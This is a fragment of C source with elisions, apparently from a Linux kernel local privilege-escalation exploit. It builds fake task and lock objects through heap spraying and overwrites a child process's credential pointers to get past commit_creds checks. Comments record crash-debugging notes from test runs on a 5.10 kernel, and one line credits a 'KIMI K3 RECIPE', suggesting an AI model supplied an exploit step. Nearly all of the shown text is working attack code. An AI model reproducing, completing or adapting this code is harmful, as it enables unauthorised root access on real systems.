...
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   ...
   */
  {
    ...
    if (use_simple) {
       ...
       *   task=init_task(P0)  lock=fake_lock  prio=0  deadline=0
       * 09-14 evening hardening: both same-day walks with
       *   task=fake_task(spray page) died AT pselect entry (fl090020/
       *   fl091910); every historical SURVIVING 5.10 walk used
       *   task=init_task P0 (on_rq==1 → ttwu no-op, F27). Spray-page
       *   task couples the walk's first deref to spray quality
       *   (KernelSnitch retried 2-3x on both boots; PM page was the
       *   0xffffff87 high alias). init_task decouples it. lock stays
      ...
      if (env_flag("MODE4_JC2_MAIN", 0)) {
        ...
        if (env_flag("MODE4_CAPS778", 0) && g_child_cred) {
          /* KIMI K3 RECIPE (09-20): the child died from BUG_ON in
           * commit_creds (cred != real_cred after writing only +0x780).
           * Fix: write BOTH pointers to the SAME cred:
           *   W0.pi  → *(child+0x778) = cred (real_cred)
           *   main   → *(child+0x780) = cred (subjective)
           * Both fire in the SAME walk (W0.pi as prerequeue erase,
           * main tree as ghost dequeue). By the time commit_creds is
           * reached, cred == real_cred → no BUG_ON. */
          g_main_pc = (uint64_t)g_child_cred;
          g_main_left = (uint64_t)(g_child_task + 0x780);
          g_pi_parent = (uint64_t)g_child_cred;
          g_pi_left = (uint64_t)(g_child_task + 0x778);
          pr_info("JC2 DUAL: main *(child+0x780)=%016llx "
                  "pi *(child+0x778)=%016llx — same cred, no BUG_ON\n",
                  (unsigned long long)g_main_pc,
                  (unsigned long long)g_pi_parent);
        }
        ...
        if (env_flag("MODE4_QEMU_MAP", 0)) {
          ...
          if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
            ...
            if (env_flag("MODE4_CRED_PI", 0)) {
              ...
              tree_r = 0;
              tree_l = 0;
              /* LEFT-child pi at prio=0: the only geometry that walked
               * clean with live pi words (r219140) — but that fire ran
               * prio=1 (branch omission). This is the untested cell of
               * the matrix: left-pi + prio=0. */
              pi_parent = val_pi;
              pi_right = 0;
              pi_left = ztgt;
              stack_prio = 0;
              stack_deadline = 0;
              pr_info("stack CRED_PI-L0: pi *%016llx = %016llx main=0\n",
                      (unsigned long long)ztgt,
